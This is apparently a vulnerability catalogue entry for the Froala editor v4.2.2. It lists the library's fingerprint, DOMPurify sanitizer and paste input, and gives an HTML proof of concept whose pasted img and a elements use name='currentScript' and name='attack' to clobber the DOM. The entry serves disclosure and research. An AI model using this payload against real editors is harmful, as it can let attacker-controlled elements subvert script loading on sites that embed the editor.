## Froala

### Meta

+ Library: Froala
+ Version: v4.2.2
+ Stars: 5.3K
+ Fingerprint: `document.getElementsByClassName('fr-box').length > 0`
+ Input: Copy&Paste
+ Sanitizer: DOMPurify
+ Capability: Any Tag & Any `name` attributes
+ CVE: N/A
+ Status: N/A

### Library

https://github.com/froala/wysiwyg-editor/tree/master/js/plugins

### Vulnerable Code Snippet

https://github.com/froala/wysiwyg-editor/blob/3b01fafe167d2dd8adf3c124c377930db13c90fc/html/paste/attrs.html#L42

### PoC 

```html
<!--Library-->
<link href="https://cdn.jsdelivr.net/npm/froala-editor@latest/css/froala_editor.pkgd.min.css" rel="stylesheet" type="text/css" />

<textarea></textarea>

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/froala-editor@latest/js/froala_editor.pkgd.min.js"></script>

<script>
  new FroalaEditor('textarea');
</script>
<!--Library-->


<!--Payload-->
<img name="currentScript" src="https://xxx.xxx.xxx">
<img name="attack" src="https://xxx.xxx.xxx">
<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
<p>Copy & Paste the following rendered HTML elements to the editor and check the editor in the debugging console.</p>
<!--Payload-->
```